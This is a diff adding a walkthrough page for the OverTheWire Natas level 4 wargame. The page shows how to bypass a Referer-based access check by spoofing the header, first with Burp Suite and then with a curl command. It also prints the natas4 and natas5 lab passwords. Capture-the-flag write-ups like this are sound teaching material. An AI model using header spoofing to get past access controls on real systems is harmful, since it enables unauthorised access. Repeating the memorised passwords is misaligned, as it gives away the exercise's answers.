@@ -1,0 +1,73 @@
+---
+title: "Natas 4"
+description: "Natas Level 4 — access control enforced via the Referer header, trivially spoofed with a proxy."
+---
+
+## Overview
+
+| Field    | Value                                        |
+|----------|----------------------------------------------|
+| URL      | `http://natas4.natas.labs.overthewire.org`   |
+| Username | `natas4`                                     |
+| Password | `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`          |
+
+The page responds with:
+
+> *Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"*
+
+The server is checking where your request originated. This is a clue — the check is being done on something your browser sends with every request.
+
+---
+
+## Hints
+
+<AccordionGroup>
+  <Accordion title="Hint 1 — What tells the server where you came from?">
+    HTTP requests include headers beyond just the URL. One header is specifically designed to tell the server which page you were on when you made the request. Look at your request in a proxy like Burp Suite — which header contains the originating URL?
+  </Accordion>
+  <Accordion title="Hint 2 — Can you set that header yourself?">
+    The `Referer` header is set by the browser to indicate the page that triggered the request. However, HTTP headers are just text in the request — any proxy or HTTP client lets you add or modify them freely. What value would make the server think you came from natas5?
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Solution
+
+<Accordion title="Full walkthrough">
+  <Steps>
+    <Step title="Intercept the request in Burp Suite">
+      Open Burp Suite with the proxy enabled. Reload the natas4 page to capture the `GET /index.php` request.
+    </Step>
+    <Step title="Add the spoofed Referer header">
+      In the intercepted request, add the following header:
+
+      ```http
+      Referer: http://natas5.natas.labs.overthewire.org/
+      ```
+    </Step>
+    <Step title="Forward and read the response">
+      Forward the modified request. The server accepts it and returns the password for natas5.
+    </Step>
+  </Steps>
+</Accordion>
+
+<Note>
+  The `Referer` header is informational only — it is sent by the browser as a courtesy and can never be trusted for access control. An attacker with any HTTP client can send any value they want.
+</Note>
+
+## With curl
+
+```bash
+# -H sets a custom request header — used here to spoof the Referer
+curl -s -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ \
+  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
+  http://natas4.natas.labs.overthewire.org/ \
+  | grep -i password
+```
+
+## Password
+
+```
+natas5: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+```
